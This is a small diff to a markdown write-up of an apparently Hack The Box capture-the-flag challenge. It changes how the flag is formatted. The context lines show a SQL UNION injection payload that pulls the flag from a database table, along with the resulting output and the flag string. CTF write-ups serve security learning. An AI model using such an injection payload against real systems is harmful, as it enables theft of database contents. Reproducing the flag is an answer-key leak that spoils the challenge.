@@ -60,5 +60,7 @@ xxx' UNION SELECT 1,2,3,4,flag FROM flag -- -
 "created_at": "HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_bae03870d038c3fc0bf034b09ffcc7d2}"
 ```
 
-> Flag: `HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_bae03870d038c3fc0bf034b09ffcc7d2}`
+::: tip Flag
+`HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_bae03870d038c3fc0bf034b09ffcc7d2}`
+:::
 
